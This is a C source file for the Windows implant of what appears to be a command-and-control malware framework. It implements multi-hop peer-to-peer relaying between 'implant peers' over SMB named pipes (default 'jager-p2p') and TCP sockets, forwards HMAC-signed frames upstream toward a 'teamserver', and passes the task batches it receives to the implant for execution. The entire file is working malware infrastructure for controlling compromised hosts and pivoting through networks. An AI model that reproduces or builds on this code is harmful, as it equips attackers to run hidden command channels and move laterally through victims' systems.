/**
 * p2p_relay.c - Multi-hop P2P frame routing between implant peers
 */
#ifdef _WIN32

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include "../../include/p2p_relay.h"
#include "../../include/json.h"
#include "../../include/crypto.h"
#include "../../include/transport.h"
#include "../../include/tasks.h"

static char       g_local_id[P2P_ID_MAX] = {0};
static PIMPLANT_CONFIG g_p2p_config = NULL;
static P2P_ROUTE  g_routes[P2P_ROUTE_MAX];
static P2P_ROUTE  g_upstream;
static CRITICAL_SECTION g_p2p_lock;
static BOOL       g_p2p_inited = FALSE;

static void p2p_lock_init(void) {
    if (!g_p2p_inited) {
        InitializeCriticalSection(&g_p2p_lock);
        ZeroMemory(g_routes, sizeof(g_routes));
        ZeroMemory(&g_upstream, sizeof(g_upstream));
        g_p2p_inited = TRUE;
    }
}

void p2p_relay_init(const char *local_id) {
    p2p_lock_init();
    EnterCriticalSection(&g_p2p_lock);
    if (local_id)
        lstrcpynA(g_local_id, local_id, sizeof(g_local_id));
    LeaveCriticalSection(&g_p2p_lock);
}

void p2p_relay_set_config(PIMPLANT_CONFIG config) {
    g_p2p_config = config;
}

void p2p_relay_set_upstream(HANDLE hPipe, SOCKET sock, P2P_TRANSPORT_TYPE type) {
    p2p_lock_init();
    EnterCriticalSection(&g_p2p_lock);
    g_upstream.hPipe = hPipe;
    g_upstream.sock = sock;
    g_upstream.type = type;
    g_upstream.active = (hPipe != INVALID_HANDLE_VALUE || sock != INVALID_SOCKET);
    LeaveCriticalSection(&g_p2p_lock);
}

static P2P_ROUTE *find_route(const char *dest_id) {
    for (int i = 0; i < P2P_ROUTE_MAX; i++) {
        if (g_routes[i].active && lstrcmpA(g_routes[i].dest_id, dest_id) == 0)
            return &g_routes[i];
    }
    return NULL;
}

BOOL p2p_route_add(const char *dest_id, HANDLE hPipe, SOCKET sock, P2P_TRANSPORT_TYPE type) {
    if (!dest_id || !dest_id[0]) return FALSE;
    p2p_lock_init();

    EnterCriticalSection(&g_p2p_lock);
    P2P_ROUTE *slot = find_route(dest_id);
    if (!slot) {
        for (int i = 0; i < P2P_ROUTE_MAX; i++) {
            if (!g_routes[i].active) {
                slot = &g_routes[i];
                break;
            }
        }
    }
    if (!slot) {
        LeaveCriticalSection(&g_p2p_lock);
        return FALSE;
    }

    lstrcpynA(slot->dest_id, dest_id, sizeof(slot->dest_id));
    slot->hPipe = hPipe;
    slot->sock = sock;
    slot->type = type;
    slot->active = TRUE;
    LeaveCriticalSection(&g_p2p_lock);
    return TRUE;
}

BOOL p2p_route_remove(const char *dest_id) {
    if (!dest_id) return FALSE;
    p2p_lock_init();

    EnterCriticalSection(&g_p2p_lock);
    P2P_ROUTE *r = find_route(dest_id);
    if (r) ZeroMemory(r, sizeof(P2P_ROUTE));
    LeaveCriticalSection(&g_p2p_lock);
    return r != NULL;
}

static BOOL p2p_compute_hmac(const BYTE *data, DWORD data_len, BYTE out[P2P_HMAC_SIZE]) {
    BYTE key[32];
    if (!transport_get_session_key(key, sizeof(key)))
        return FALSE;
    return crypto_hmac_trunc8(key, sizeof(key), data, data_len, out);
}

static BOOL p2p_verify_hmac(const BYTE *frame, DWORD frame_len) {
    if (frame_len < P2P_HDR_SIZE)
        return FALSE;

    BYTE received[P2P_HMAC_SIZE];
    BYTE computed[P2P_HMAC_SIZE];
    CopyMemory(received, frame + 4, P2P_HMAC_SIZE);
    if (!p2p_compute_hmac(frame + 4 + P2P_HMAC_SIZE, frame_len - 4 - P2P_HMAC_SIZE, computed))
        return FALSE;
    return memcmp(received, computed, P2P_HMAC_SIZE) == 0;
}

DWORD p2p_frame_pack(const char *dest_id, const char *src_id,
                     const BYTE *payload, DWORD payload_len,
                     BYTE *out, DWORD out_cap) {
    if (!dest_id || !src_id || !out) return 0;
    if (payload_len > 0 && !payload) return 0;
    if (P2P_HDR_SIZE + payload_len > out_cap) return 0;

    ZeroMemory(out, P2P_HDR_SIZE);
    *(DWORD *)out = P2P_FRAME_MAGIC;
    lstrcpynA((char *)(out + 4 + P2P_HMAC_SIZE), dest_id, P2P_ID_MAX);
    lstrcpynA((char *)(out + 4 + P2P_HMAC_SIZE + P2P_ID_MAX), src_id, P2P_ID_MAX);
    *(DWORD *)(out + 4 + P2P_HMAC_SIZE + P2P_ID_MAX * 2) = payload_len;

    if (payload_len > 0)
        CopyMemory(out + P2P_HDR_SIZE, payload, payload_len);

    DWORD auth_len = P2P_HDR_SIZE - 4 - P2P_HMAC_SIZE + payload_len;
    if (!p2p_compute_hmac(out + 4 + P2P_HMAC_SIZE, auth_len, out + 4))
        return 0;

    return P2P_HDR_SIZE + payload_len;
}

BOOL p2p_send_frame(HANDLE hPipe, SOCKET sock, P2P_TRANSPORT_TYPE type,
                    const BYTE *frame, DWORD frame_len) {
    if (!frame || frame_len < P2P_HDR_SIZE) return FALSE;

    if (type == P2P_TRANSPORT_PIPE && hPipe != INVALID_HANDLE_VALUE) {
        DWORD written = 0;
        return WriteFile(hPipe, frame, frame_len, &written, NULL) && written == frame_len;
    }
    if (type == P2P_TRANSPORT_TCP && sock != INVALID_SOCKET) {
        int sent = send(sock, (const char *)frame, (int)frame_len, 0);
        return sent == (int)frame_len;
    }
    return FALSE;
}

static BOOL p2p_deliver_local(const BYTE *payload, DWORD payload_len) {
    if (!payload || payload_len <= 0 || !g_p2p_config)
        return FALSE;

    PC2_TASK tasks = NULL;
    DWORD count = transport_parse_tasks((const char *)payload, payload_len, &tasks);
    if (count == 0 || !tasks)
        return FALSE;

    tasks_process_batch(g_p2p_config, tasks, count);
    HeapFree(GetProcessHeap(), 0, tasks);
    return TRUE;
}

BOOL p2p_relay_process(HANDLE hPipe, SOCKET sock, P2P_TRANSPORT_TYPE type,
                       const BYTE *data, DWORD data_len) {
    if (!data || data_len < P2P_HDR_SIZE) return FALSE;
    if (*(DWORD *)data != P2P_FRAME_MAGIC) return FALSE;
    if (!p2p_verify_hmac(data, data_len)) return FALSE;

    char dest_id[P2P_ID_MAX];
    char src_id[P2P_ID_MAX];
    lstrcpynA(dest_id, (const char *)(data + 4 + P2P_HMAC_SIZE), P2P_ID_MAX);
    lstrcpynA(src_id, (const char *)(data + 4 + P2P_HMAC_SIZE + P2P_ID_MAX), P2P_ID_MAX);
    DWORD payload_len = *(DWORD *)(data + 4 + P2P_HMAC_SIZE + P2P_ID_MAX * 2);
    if (P2P_HDR_SIZE + payload_len > data_len) return FALSE;

    const BYTE *payload = data + P2P_HDR_SIZE;

    p2p_lock_init();
    EnterCriticalSection(&g_p2p_lock);

    /* Destination is this implant */
    if (g_local_id[0] && lstrcmpA(dest_id, g_local_id) == 0) {
        LeaveCriticalSection(&g_p2p_lock);
        return p2p_deliver_local(payload, payload_len);
    }

    /* Forward to registered peer route */
    P2P_ROUTE *route = find_route(dest_id);
    if (route) {
        BOOL ok = p2p_send_frame(route->hPipe, route->sock, route->type, data, data_len);
        LeaveCriticalSection(&g_p2p_lock);
        return ok;
    }

    /* Multi-hop: forward upstream toward teamserver-connected parent */
    if (g_upstream.active) {
        BOOL ok = p2p_send_frame(g_upstream.hPipe, g_upstream.sock, g_upstream.type, data, data_len);
        LeaveCriticalSection(&g_p2p_lock);
        return ok;
    }

    LeaveCriticalSection(&g_p2p_lock);
    return FALSE;
}

BOOL p2p_relay_configure(const char *json, DWORD json_len) {
    if (!json || json_len < 3) return FALSE;

    char buf[4096];
    if (json_len >= sizeof(buf)) return FALSE;
    CopyMemory(buf, json, json_len);
    buf[json_len] = '\0';

    const char *routes = strstr(buf, "\"routes\"");
    if (!routes) return FALSE;

    const char *p = routes;
    while ((p = strchr(p, '{')) != NULL) {
        const char *end = strchr(p, '}');
        if (!end) break;

        char obj[512];
        DWORD olen = (DWORD)(end - p + 1);
        if (olen >= sizeof(obj)) break;
        CopyMemory(obj, p, olen);
        obj[olen] = '\0';

        char id[P2P_ID_MAX] = {0};
        char target[256] = {0};
        char pipe_name[256] = {0};
        int port = 0;
        json_find_string(obj, "id", id, sizeof(id));
        json_find_string(obj, "target", target, sizeof(target));
        json_find_string(obj, "pipe", pipe_name, sizeof(pipe_name));
        json_find_int(obj, "port", &port);

        if (id[0] && target[0]) {
            if (port > 0) {
                SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                if (s != INVALID_SOCKET) {
                    struct sockaddr_in addr;
                    ZeroMemory(&addr, sizeof(addr));
                    addr.sin_family = AF_INET;
                    addr.sin_port = htons((u_short)port);
                    inet_pton(AF_INET, target, &addr.sin_addr);
                    if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) == 0)
                        p2p_route_add(id, INVALID_HANDLE_VALUE, s, P2P_TRANSPORT_TCP);
                    else
                        closesocket(s);
                }
            } else {
                char full_pipe[512];
                if (pipe_name[0])
                    _snprintf(full_pipe, sizeof(full_pipe), "\\\\%s\\pipe\\%s", target, pipe_name);
                else
                    _snprintf(full_pipe, sizeof(full_pipe), "\\\\%s\\pipe\\jager-p2p", target);

                HANDLE h = CreateFileA(full_pipe, GENERIC_READ | GENERIC_WRITE,
                                       0, NULL, OPEN_EXISTING, 0, NULL);
                if (h != INVALID_HANDLE_VALUE)
                    p2p_route_add(id, h, INVALID_SOCKET, P2P_TRANSPORT_PIPE);
            }
        }
        p = end + 1;
    }
    return TRUE;
}

#else
#include "../../include/p2p_relay.h"
void p2p_relay_init(const char *local_id) { (void)local_id; }
void p2p_relay_set_upstream(HANDLE h, SOCKET s, P2P_TRANSPORT_TYPE t) { (void)h;(void)s;(void)t; }
BOOL p2p_route_add(const char *d, HANDLE h, SOCKET s, P2P_TRANSPORT_TYPE t) { (void)d;(void)h;(void)s;(void)t; return 0; }
BOOL p2p_route_remove(const char *d) { (void)d; return 0; }
DWORD p2p_frame_pack(const char *a,const char *b,const BYTE *p,DWORD n,BYTE *o,DWORD c) { (void)a;(void)b;(void)p;(void)n;(void)o;(void)c; return 0; }
BOOL p2p_send_frame(HANDLE h,SOCKET s,P2P_TRANSPORT_TYPE t,const BYTE *f,DWORD n) { (void)h;(void)s;(void)t;(void)f;(void)n; return 0; }
BOOL p2p_relay_process(HANDLE h,SOCKET s,P2P_TRANSPORT_TYPE t,const BYTE *d,DWORD n) { (void)h;(void)s;(void)t;(void)d;(void)n; return 0; }
BOOL p2p_relay_configure(const char *j,DWORD n) { (void)j;(void)n; return 0; }
#endif
